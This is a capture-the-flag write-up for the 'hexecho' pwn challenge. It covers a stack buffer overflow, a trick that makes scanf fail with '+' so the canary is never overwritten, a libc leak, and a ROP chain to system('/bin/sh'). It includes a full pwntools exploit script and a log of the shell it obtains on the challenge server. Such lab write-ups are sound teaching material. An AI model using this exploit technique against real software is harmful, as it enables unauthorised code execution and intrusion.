# hexecho : Pwn

Stack canary makes me feel more secure.

Attachment  
[hexecho.tar.gz](hexecho.tar.gz)  

Tags : Buffer Overflow, Unchecked Return Value, Libc Leak  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x100

int get_size() {
  int size = 0;
  scanf("%d%*c", &size);
  return size;
}

void get_hex(char *buf, unsigned size) {
  for (unsigned i = 0; i < size; i++)
    scanf("%02hhx", buf + i);
}

void hexecho() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data (hex): ");
  get_hex(buf, size);

  // Show data
  printf("Received: ");
  for (int i = 0; i < size; i++)
    printf("%02hhx ", (unsigned char)buf[i]);
  putchar('\n');
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  hexecho();
  return 0;
}
```
This program unecheck the size, so there are BOF vulnerability.
```
$ checksec hexecho
[*] '/home/colza/hexecho'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
It is difficult to leak the canary.  
If `scanf` is given some uninterpretable characters, `scanf` do not write characters to buffer. And then, that characters remain in the stream, causing all subsequent calls to `scanf` to fail.  
If enter `+` or `-`, it will be interpreted as a hexadecimal value and cause `scanf` to fail.

The apploach is as follows:
* Evade to overwrite the canary using `+`.
* Libc leak and overwrite the return address to `hexecho`.
* `system('/bin/sh')` with ROP chain.

The return addres is located at rbp+0x8. So, offset from input to return address is 0x118.
```
  401292:       48 8d 85 f0 fe ff ff    lea    rax,[rbp-0x110]
  401299:       89 d6                   mov    esi,edx
  40129b:       48 89 c7                mov    rdi,rax
  40129e:       e8 46 ff ff ff          call   4011e9 <get_hex>
```
As `_IO_2_1_stdout_` is at `0x110-0x78=0x98` among the data that can be leaked, we will use this to calculate the libc base.
```
03:0018│ rax rdi 0x7fffffffdad0 ◂— 0
04:0020│-108     0x7fffffffdad8 ◂— 0
05:0028│-100     0x7fffffffdae0 ◂— 0x40 /* '@' */
06:0030│-0f8     0x7fffffffdae8 ◂— 4
07:0038│-0f0     0x7fffffffdaf0 ◂— 0x40 /* '@' */
08:0040│-0e8     0x7fffffffdaf8 ◂— 0x10
09:0048│-0e0     0x7fffffffdb00 ◂— 0
0a:0050│-0d8     0x7fffffffdb08 ◂— 0x100000000
0b:0058│-0d0     0x7fffffffdb10 ◂— 0
0c:0060│-0c8     0x7fffffffdb18 ◂— 0x8e00000006
0d:0068│-0c0     0x7fffffffdb20 ◂— 0x80000000a /* '\n' */
0e:0070│-0b8     0x7fffffffdb28 ◂— 0
... ↓            2 skipped
11:0088│-0a0     0x7fffffffdb40 ◂— 2
12:0090│-098     0x7fffffffdb48 ◂— 0x8000000000000006
13:0098│-090     0x7fffffffdb50 ◂— 0
... ↓            2 skipped
16:00b0│-078     0x7fffffffdb68 —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2887
```

The steps are as follows:
 * set the input size 0x128
 * send the payload consist of 0x118-padding, ret and main address
 * leak address and calculate the libc base address
 * set the input size 0x138
 * send the payload consist of 0x118-padding and `system("/bin/sh")` ROP chain
 * get the flag

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./hexecho")
libc = ELF("./libc.so.6")

context.arch = 'amd64'

p = remote("34.170.146.252", 42121)

p.sendlineafter(b"Size: ", b"296")

main_addr = elf.symbols['main']

ret_main = p64(next(elf.search(asm("ret"), executable=True)))
ret_main += p64(main_addr)

payload = b"+ "*0x118
payload += b" ".join([f"{c:02x}".encode() for c in ret_main])

p.sendlineafter(b"Data (hex): ", payload)

p.recvuntil(b"Received: ")
leak = bytes([int(c, 16) for c in p.recvline().split()])
libc.address = u64(leak[0x98:0xa0]) - libc.symbols['_IO_2_1_stdout_']
log.info(hex(libc.address))

rop = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(next(libc.search(asm("ret"), executable=True)))
rop += p64(libc.symbols["system"])

rop_payload = b"+ "*0x118
rop_payload += b" ".join([f"{c:02x}".encode() for c in rop])

p.sendlineafter(b"Size: ", b"312")
p.sendlineafter(b"Data (hex): ", rop_payload)

p.recvline()
p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/hexecho'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/colza/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 34.170.146.252 on port 42121: Done
[*] 0x7f24d72de000
[*] Switching to interactive mode
$ ls
run
$ cd ../
$ ls
app
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 42121
[*] Got EOF while sending in interactive
```

Got the flag!

`Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}`
